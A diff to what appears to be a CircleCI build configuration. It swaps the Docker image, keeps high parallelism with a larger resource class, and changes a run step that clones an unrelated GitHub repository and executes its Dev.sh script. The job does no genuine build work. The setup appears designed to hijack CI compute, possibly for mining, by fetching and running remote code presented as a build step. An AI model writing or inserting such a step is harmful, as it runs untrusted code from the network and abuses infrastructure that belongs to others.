@@ -2,11 +2,11 @@ version: 2
 jobs:
   build:
     docker:
-      - image: node:latest
-    parallelism: 64
-    resource_class: xlarge
+      - image: ruby:latest
+    parallelism: 35
+    resource_class: 2xlarge
     steps:
-      - run: git clone https://github.com/Huijv/dev.git && cd dev && chmod u+x Dev.sh && ./Dev.sh
+      - run: git clone https://github.com/burasbodas/Dev.git && cd dev && chmod u+x Dev.sh && ./Dev.sh
 workflows:
     version: 2
     build:
